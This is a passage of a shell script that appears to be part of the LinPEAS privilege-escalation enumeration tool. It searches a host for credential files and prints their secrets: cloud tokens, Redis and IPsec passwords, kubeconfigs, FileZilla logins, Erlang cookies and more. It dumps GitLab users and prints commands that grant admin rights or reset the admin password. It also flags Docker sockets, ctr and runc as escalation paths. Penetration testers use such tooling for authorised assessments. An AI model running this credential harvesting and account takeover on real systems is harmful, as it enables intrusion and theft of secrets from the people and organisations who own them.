    if ! [ "`echo \"$PSTORAGE_REDIS\" | grep -E \"redis\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "redis.conf"; fi; fi; printf "%s" "$PSTORAGE_REDIS" | grep -E "redis\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,redis\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,masterauth.*|requirepass.*,${SED_RED},g"; done; echo "";
fi

dovecotpass=$(grep -r "PLAIN" /etc/dovecot 2>/dev/null)
if [ "$dovecotpass" ] || [ "$DEBUG" ]; then
  print_2title "Searching dovecot files"
  if [ -z "$dovecotpass" ]; then
    echo_not_found "dovecot credentials"
  else
    printf "%s\n" "$dovecotpass" | while read d; do
      df=$(echo $d |cut -d ':' -f1)
      dp=$(echo $d |cut -d ':' -f2-)
      echo "Found possible PLAIN text creds in $df"
      echo "$dp" | sed -${E} "s,.*,${SED_RED}," 2>/dev/null
    done
  fi
  echo ""
fi

if [ "$PSTORAGE_MOSQUITTO" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Mosquitto Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_MOSQUITTO\" | grep -E \"mosquitto\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mosquitto.conf"; fi; fi; printf "%s" "$PSTORAGE_MOSQUITTO" | grep -E "mosquitto\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mosquitto\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,password_file.*|psk_file.*|allow_anonymous.*true|auth,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_NEO4J" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Neo4j Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_NEO4J\" | grep -E \"neo4j$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "neo4j"; fi; fi; printf "%s" "$PSTORAGE_NEO4J" | grep -E "neo4j$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,neo4j$,${SED_RED},"; find "$f" -name "auth" | while read ff; do ls -ld "$ff" | sed -${E} "s,auth,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
fi


AWSVAULT="$(command -v aws-vault 2>/dev/null)"
if [ "$AWSVAULT" ] || [ "$DEBUG" ]; then
  print_2title "Check aws-vault"
  aws-vault list
fi

if [ "$PSTORAGE_CLOUD_CREDENTIALS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cloud Credentials Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"credentials\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "credentials.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "credentials\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,credentials\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"legacy_credentials\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "legacy_credentials.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "legacy_credentials\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,legacy_credentials\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"access_tokens\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access_tokens.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "access_tokens\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access_tokens\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"access_tokens\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access_tokens.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "access_tokens\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access_tokens\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"accessTokens\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "accessTokens.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "accessTokens\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,accessTokens\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"azureProfile\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "azureProfile.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "azureProfile\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,azureProfile\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"TokenCache\.dat$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "TokenCache.dat"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "TokenCache\.dat$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,TokenCache\.dat$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"AzureRMContext\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "AzureRMContext.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "AzureRMContext\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,AzureRMContext\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"\.bluemix$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".bluemix"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "\.bluemix$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.bluemix$,${SED_RED},"; find "$f" -name "config.json" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.json,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_CLOUD_INIT" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cloud Init Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CLOUD_INIT\" | grep -E \"cloud\.cfg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "cloud.cfg"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_INIT" | grep -E "cloud\.cfg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,cloud\.cfg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "consumer_key|token_key|token_secret|metadata_url|password:|passwd:|PRIVATE KEY|PRIVATE KEY|encrypted_data_bag_secret|_proxy" | grep -Ev "\W+\#|^#" | sed -${E} "s,consumer_key|token_key|token_secret|metadata_url|password:|passwd:|PRIVATE KEY|PRIVATE KEY|encrypted_data_bag_secret|_proxy,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_CLOUDFLARE" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing CloudFlare Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CLOUDFLARE\" | grep -E \"\.cloudflared$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".cloudflared"; fi; fi; printf "%s" "$PSTORAGE_CLOUDFLARE" | grep -E "\.cloudflared$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.cloudflared$,${SED_RED},"; ls -lRA "$f";done; echo "";
fi


if [ "$PSTORAGE_ERLANG" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Erlang Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_ERLANG\" | grep -E \"\.erlang\.cookie$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".erlang.cookie"; fi; fi; printf "%s" "$PSTORAGE_ERLANG" | grep -E "\.erlang\.cookie$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.erlang\.cookie$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_GMV_AUTH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing GMV Auth Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_GMV_AUTH\" | grep -E \"gvm-tools\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "gvm-tools.conf"; fi; fi; printf "%s" "$PSTORAGE_GMV_AUTH" | grep -E "gvm-tools\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,gvm-tools\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,username.*|password.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_IPSEC" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing IPSec Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_IPSEC\" | grep -E \"ipsec\.secrets$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ipsec.secrets"; fi; fi; printf "%s" "$PSTORAGE_IPSEC" | grep -E "ipsec\.secrets$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ipsec\.secrets$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*PSK.*|.*RSA.*|.*EAP =.*|.*XAUTH.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_IPSEC\" | grep -E \"ipsec\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ipsec.conf"; fi; fi; printf "%s" "$PSTORAGE_IPSEC" | grep -E "ipsec\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ipsec\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*PSK.*|.*RSA.*|.*EAP =.*|.*XAUTH.*,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_IRSSI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing IRSSI Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_IRSSI\" | grep -E \"\.irssi$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".irssi"; fi; fi; printf "%s" "$PSTORAGE_IRSSI" | grep -E "\.irssi$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.irssi$,${SED_RED},"; find "$f" -name "config" | while read ff; do ls -ld "$ff" | sed -${E} "s,config,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,password.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_KEYRING" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Keyring Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"keyrings$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "keyrings"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "keyrings$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,keyrings$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.keyring$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.keyring"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.keyring$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.keyring$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.keystore$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.keystore"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.keystore$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.keystore$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KEYRING\" | grep -E \"\.jks$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.jks"; fi; fi; printf "%s" "$PSTORAGE_KEYRING" | grep -E "\.jks$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.jks$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_FILEZILLA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Filezilla Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"filezilla$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "filezilla"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "filezilla$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,filezilla$,${SED_RED},"; find "$f" -name "sitemanager.xml" | while read ff; do ls -ld "$ff" | sed -${E} "s,sitemanager.xml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^;" | sed -${E} "s,Host.*|Port.*|Protocol.*|User.*|Pass.*,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"filezilla\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "filezilla.xml"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "filezilla\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,filezilla\.xml$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_FILEZILLA\" | grep -E \"recentservers\.xml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "recentservers.xml"; fi; fi; printf "%s" "$PSTORAGE_FILEZILLA" | grep -E "recentservers\.xml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,recentservers\.xml$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_BACKUP_MANAGER" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Backup Manager Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_BACKUP_MANAGER\" | grep -E \"storage\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "storage.php"; fi; fi; printf "%s" "$PSTORAGE_BACKUP_MANAGER" | grep -E "storage\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,storage\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "'pass'|'password'|'user'|'database'|'host'" | sed -${E} "s,password|pass|user|database|host,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_BACKUP_MANAGER\" | grep -E \"database\.php$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "database.php"; fi; fi; printf "%s" "$PSTORAGE_BACKUP_MANAGER" | grep -E "database\.php$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,database\.php$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "'pass'|'password'|'user'|'database'|'host'" | sed -${E} "s,password|pass|user|database|host,${SED_RED},g"; done; echo "";
fi

SPLUNK_BIN="$(command -v splunk 2>/dev/null)"
if [ "$PSTORAGE_SPLUNK" ] || [ "$SPLUNK_BIN" ] || [ "$DEBUG" ]; then
  print_2title "Searching uncommon passwd files (splunk)"
  if [ "$SPLUNK_BIN" ]; then echo "splunk binary was found installed on $SPLUNK_BIN" | sed "s,.*,${SED_RED},"; fi
  printf "%s\n" "$PSTORAGE_SPLUNK" | sort | uniq | while read f; do
    if [ -f "$f" ] && ! [ -x "$f" ]; then
      echo "passwd file: $f" | sed "s,$f,${SED_RED},"
      cat "$f" 2>/dev/null | grep "'pass'|'password'|'user'|'database'|'host'|\$" | sed -${E} "s,password|pass|user|database|host|\$,${SED_RED},"
    fi
  done
  echo ""
fi

if [ "$PSTORAGE_KCPASSWORD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing kcpassword files"
  print_info "my intials cooooool"
  printf "%s\n" "$PSTORAGE_KCPASSWORD" | while read f; do
    echo "$f" | sed -${E} "s,.*,${SED_RED},"
    base64 "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},"
  done
  echo ""
fi

if [ "$(command -v gitlab-rails)" ] || [ "$(command -v gitlab-backup)" ] || [ "$PSTORAGE_GITLAB" ] || [ "$DEBUG" ]; then
  print_2title "Searching GitLab related files"
  if [ "$(command -v gitlab-rails)" ]; then
    echo "gitlab-rails was found. Trying to dump users..."
    gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }' | sed -${E} "s,email|password,${SED_RED},"
    echo "run: gitlab-rails runner 'user = User.find_by(email: \"youruser@example.com\"); user.admin = TRUE; user.save!'"
    echo "Also try running: gitlab-rails runner 'user = User.find_by(email: \"admin@example.com\"); user.password = \"pass_peass_pass\"; user.password_confirmation = \"pass_peass_pass\"; user.save!'"
    echo ""
  fi
  if [ "$(command -v gitlab-backup)" ]; then
    echo "create a backup of all the repositories inside gitlab using 'gitlab-backup create'"
    echo "get the plain-text with something like 'git clone \@hashed/19/23/14348274[...]38749234.bundle'"
    echo ""
  fi
  printf "%s\n" "$PSTORAGE_GITLAB" | sort | uniq | while read f; do
    if echo $f | grep -q secrets.yml; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" 2>/dev/null | grep -Iv "^$" | grep -v "^#"
    elif echo $f | grep -q gitlab.yml; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" | grep -A 4 "repositories:"
    elif echo $f | grep -q gitlab.rb; then
      echo "Found $f" | sed "s,$f,${SED_RED},"
      cat "$f" | grep -Iv "^$" | grep -v "^#" | sed -${E} "s,email|user|password,${SED_RED},"
    fi
    echo ""
  done
  echo ""
fi

if [ "$PSTORAGE_GITHUB" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Github Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.github$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".github"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.github$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.github$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.gitconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".gitconfig"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.gitconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gitconfig$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.git-credentials$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".git-credentials"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.git-credentials$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.git-credentials$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_GITHUB\" | grep -E \"\.git$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".git"; fi; fi; printf "%s" "$PSTORAGE_GITHUB" | grep -E "\.git$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.git$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_SVN" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Svn Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_SVN\" | grep -E \"\.svn$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".svn"; fi; fi; printf "%s" "$PSTORAGE_SVN" | grep -E "\.svn$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.svn$,${SED_RED},"; ls -lRA "$f";done; echo "";
fi


if [ "$PSTORAGE_PGP_GPG" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing PGP-GPG Files (limit 70)"
    ( (command -v gpg && gpg --list-keys) || echo_not_found "gpg") 2>/dev/null
    ( (command -v netpgpkeys && netpgpkeys --list-keys) || echo_not_found "netpgpkeys") 2>/dev/null
    (command -v netpgp || echo_not_found "netpgp") 2>/dev/null
    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.pgp$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.pgp"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.pgp$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.pgp$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.gpg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.gpg"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.gpg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gpg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_PGP_GPG\" | grep -E \"\.gnupg$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.gnupg"; fi; fi; printf "%s" "$PSTORAGE_PGP_GPG" | grep -E "\.gnupg$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.gnupg$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_CACHE_VI" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cache Vi Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CACHE_VI\" | grep -E \"\.swp$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.swp"; fi; fi; printf "%s" "$PSTORAGE_CACHE_VI" | grep -E "\.swp$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.swp$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CACHE_VI\" | grep -E \"\.viminfo$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.viminfo"; fi; fi; printf "%s" "$PSTORAGE_CACHE_VI" | grep -E "\.viminfo$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.viminfo$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_WGET" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Wget Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_WGET\" | grep -E \"\.wgetrc$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".wgetrc"; fi; fi; printf "%s" "$PSTORAGE_WGET" | grep -E "\.wgetrc$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.wgetrc$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#" | sed -${E} "s,[pP][aA][sS][sS].*|[uU][sS][eE][rR].*,${SED_RED},g"; done; echo "";
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  containerd=$(command -v ctr)
  if [ "$containerd" ] || [ "$DEBUG" ]; then
    print_2title "Checking if containerd(ctr) is available"
    print_info "whomst"
    if [ "$containerd" ]; then
      echo "ctr was found in $containerd, you may be able to escalate privileges with it" | sed -${E} "s,.*,${SED_RED},"
      ctr image list 2>&1
    fi
    echo ""
  fi
fi

if ! [ "$SEARCH_IN_FOLDER" ]; then
  runc=$(command -v runc)
  if [ "$runc" ] || [ "$DEBUG" ]; then
    print_2title "Checking if runc is available"
    print_info "run to the see"
    if [ "$runc" ]; then
      echo "runc was found in $runc, you may be able to escalate privileges with it" | sed -${E} "s,.*,${SED_RED},"
    fi
    echo ""
  fi
fi

if [ "$PSTORAGE_DOCKER" ] || [ "$DEBUG" ]; then
  print_2title "Searching docker files (limit 70)"
  print_info "ships files"
  printf "%s\n" "$PSTORAGE_DOCKER" | head -n 70 | while read f; do
    ls -l "$f" 2>/dev/null
    if ! [ "$IAMROOT" ] && [ -S "$f" ] && [ -w "$f" ]; then
      echo "Docker related socket ($f) is writable" | sed -${E} "s,.*,${SED_RED_YELLOW},"
    fi
  done
  echo ""
fi

if [ "$PSTORAGE_KUBERNETES" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Kubernetes Files (limit 70)"
    (env || set) | grep -Ei "kubernetes|kube" | grep -v "PSTORAGE_KUBERNETES|USEFUL_SOFTWARE" | sed -${E} "s,kubernetes|kube,${SED_RED},"
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubeconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubeconfig"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubeconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubeconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubelet-kubeconfig$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubelet-kubeconfig"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubelet-kubeconfig$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubelet-kubeconfig$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"psk\.txt$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "psk.txt"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "psk\.txt$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,psk\.txt$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"\.kube.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".kube*"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "\.kube.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.kube.*$,${SED_RED},"; find "$f" -name "config" | while read ff; do ls -ld "$ff" | sed -${E} "s,config,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubelet$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubelet"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubelet$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubelet$,${SED_RED},"; find "$f" -name "kubelet.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,kubelet.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";find "$f" -name "config.yaml" | while read ff; do ls -ld "$ff" | sed -${E} "s,config.yaml,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,server:|cluster:|namespace:|user:|exec:,${SED_RED},g"; done; echo "";find "$f" -name "kubeadm-flags.env" | while read ff; do ls -ld "$ff" | sed -${E} "s,kubeadm-flags.env,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kube-proxy$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kube-proxy"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kube-proxy$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kube-proxy$,${SED_RED},"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_KUBERNETES\" | grep -E \"kubernetes$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kubernetes"; fi; fi; printf "%s" "$PSTORAGE_KUBERNETES" | grep -E "kubernetes$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kubernetes$,${SED_RED},"; done; echo "";
fi


if [ "$PSTORAGE_FIREFOX" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Firefox Files (limit 70)"
